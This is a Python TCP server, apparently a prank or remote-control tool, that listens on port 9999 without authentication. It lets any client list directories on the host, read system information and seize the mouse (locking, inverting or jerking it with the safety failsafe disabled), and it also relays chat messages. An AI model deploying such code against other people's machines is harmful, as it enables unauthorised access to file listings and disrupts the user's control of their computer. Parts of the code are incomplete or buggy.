import socket
import threading
import os
import json
import platform
import pyautogui
import time
import random

clients = []
current_directory = os.path.dirname(os.path.abspath(__file__))
server_directory = os.path.join(current_directory, 'servidor')

def handle_client(client_socket, client_address):
    global clients
    clients.append((client_socket, client_address))
    print(f"Cliente {client_address} conectado com sucesso!")
    try:
        while True:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                break
            print(f"Recebido de {client_address}: {message}")
            try:
                action, command = message.split('|', 1)
            except ValueError:
                action = message.strip()
                command = ''
            
            json_message = {'action': action, 'command': command}
            
            if json_message['action'] == 'list_dir':
                path = json_message['command'].strip() if json_message['command'] else os.getcwd()
                try:
                    files = os.listdir(path)
                    response = "\n".join(files) + "\n"  # Converte a lista de arquivos em uma string com quebras de linha
                    print(f"Enviando arquivos do diretório {path}:\n{response}")
                    client_socket.send((json.dumps(files) + '\n').encode('utf-8'))
                except FileNotFoundError:
                    response = "\n"
                    print(f"Diretório não encontrado: {path}. Enviando resposta vazia.")
                    client_socket.send(response.encode('utf-8'))
            elif json_message['action'] == 'sys_info':
                info = {
                    'os': os.name,
                    'platform': platform.system(),
                    'platform_release': platform.release(),
                    'cwd': os.getcwd()
                }
                client_socket.send((json.dumps(info) + '\n').encode('utf-8'))
            elif json_message['action'] == 'mouse_control':
                command, *params = json_message['command'].split('|', 1)
                params = params[0] if params else '{}'
                perform_mouse_action(command, json.loads(params))
            elif json_message['action'] == 'rotate_screen':
                rotate_screen()
            elif json_message['action'] == 'chat':
                if command.strip().lower() == 'exit':
                    break
                broadcast_message(command, client_socket)
                

    except Exception as e:
        print(f"Exceção inesperada no cliente {client_address}: {e}")
    finally:
        print(f"Conexão com o cliente {client_address} fechada.")
        if (client_socket, client_address) in clients:  
            clients.remove((client_socket, client_address))
        client_socket.close()

def perform_mouse_action(command, params):
    print(f"Entrando no perform com o comando: {command}")
    try:
        command = command.split(':')[0].strip()
        if command.strip() == 'limit':
            
            around_size = int(params.get('around_size'))  # Obtém o tamanho da área ao redor ou define como 100 se não fornecido
            duration = int(params.get('duration'))  # Obtém a duração ou define como 5 segundos se não fornecido
            print(f"Entrando no limit a:{around_size} e d:{duration}")

            limit_mouse_movement(around_size, duration)

        elif command.strip() == 'lock':
            lock_mouse_movement()

        elif command.strip() == 'invert':
            invert_mouse_movement()

        elif command.strip() == "punch":
            punch_mouse()
        else:
            print(f"Comando desconhecido: {command}")
    except Exception as e:
        print(f"Erro ao processar ação do mouse: {e}")

def limit_mouse_movement(around_size, duration):
    try:
        current_x, current_y = pyautogui.position()
        left = current_x - around_size
        top = current_y - around_size
        right = current_x + around_size
        bottom = current_y + around_size

        start_time = time.time()

        while time.time() - start_time < duration:
            new_x, new_y = pyautogui.position()
            if not (left <= new_x <= right and top <= new_y <= bottom):
                pyautogui.moveTo(
                    min(max(left, new_x), right), 
                    min(max(top, new_y), bottom)
                )
    except Exception as e:
        print(f"Erro ao limitar o movimento do mouse: {e}")

def lock_mouse_movement():
    start_time = time.time()
    x, y = pyautogui.position()
    print(f"Travando o mouse na posição ({x}, {y}) por 5 segundos")

    def lock_movement():
        while time.time() - start_time < 5:
            pyautogui.moveTo(x, y)
            time.sleep(0.01)
        print("Destravando o mouse")

    threading.Thread(target=lock_movement).start()

def invert_mouse_movement():
    pyautogui.FAILSAFE = False
    try:
        start_time = time.time()
        screen_width, screen_height = pyautogui.size()
        center_x = screen_width // 2
        center_y = screen_height // 2
        
        while time.time() - start_time < 5:
            x, y = pyautogui.position()
            delta_x = center_x - x
            delta_y = center_y - y
            inverted_x = center_x + delta_x
            inverted_y = center_y + delta_y
            pyautogui.moveTo(inverted_x, inverted_y)
    finally:
        pyautogui.FAILSAFE = True

def punch_mouse():
    pyautogui.FAILSAFE = False
    try:
        screen_width, screen_height = pyautogui.size()
        x, y = pyautogui.position()

        # Escolhendo uma direção aleatória (cima, baixo, esquerda ou direita)
        direction = random.choice(['up', 'down', 'left', 'right'])

        max_distance = min(screen_width, screen_height) // 2
        
        # Definindo a quantidade de movimento para o soco
        punch_distance = random.randint(500, max_distance)

        if direction == 'up':
            new_y = max(0, y - punch_distance)
            pyautogui.moveTo(x, new_y, duration=0.2)
        elif direction == 'down':
            new_y = min(screen_height, y + punch_distance)
            pyautogui.moveTo(x, new_y, duration=0.2)
        elif direction == 'left':
            new_x = max(0, x - punch_distance)
            pyautogui.moveTo(new_x, y, duration=0.2)
        elif direction == 'right':
            new_x = min(screen_width, x + punch_distance)
            pyautogui.moveTo(new_x, y, duration=0.2)
    finally:
        pyautogui.FAILSAFE = True

def rotate_screen():
    test = 1

def receive_message(client_socket):
    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            if not message or message.strip().lower() == 'exits':
                print(f"Cliente {client_socket.getpeername()} encerrou o chat.")
                clients.remove(client_socket)
                client_socket.close()
                break
            print(f"Cliente {client_socket.getpeername()}: {message}")
            broadcast_message(message, sender_socket=client_socket, sender_name=client_socket.getpeername())
        except:
            continue

def broadcast_message(message, sender_socket=None):
    prefix = "Servidor" if sender_socket == None else "Client" 

    message_s = f"{prefix}: {message}"
    for client, _ in clients:
        if client == sender_socket:
            try:
                print(message_s)
            except:
                client.close()
                clients.remove(client)
        else:
            msg = message + '\n'
            client.sendall(msg.encode('utf-8'))
            print(message_s)
    


def server_chat():
    def server_input():
        while True:
            message = input("")
            if message.strip().lower() == 'exits':
                print("Servidor está encerrando o chat.")
                broadcast_message("Servidor encerrou o chat.")
                for client_socket, _ in clients:  # Alteração aqui
                    client_socket.close() 
                clients.clear()
                break
            broadcast_message(message)

    threading.Thread(target=server_input).start()


chat_thread = threading.Thread(target=server_chat)
chat_thread.start()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print("Servidor iniciado. Aguardando conexões...")
    
    running = True
    
    try:
        while running:
            try:
                client_socket, client_address = server.accept()
                client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
                client_handler.start()
            except OSError as e:
                print(f"Erro ao aceitar conexão: {e}")
    except KeyboardInterrupt:
        print("Recebido sinal de interrupção. Encerrando o servidor...")
    finally:
        server.close()
        for client_socket, _ in clients:
            client_socket.close()
        print("Servidor encerrado.")

if __name__ == "__main__":
    start_server()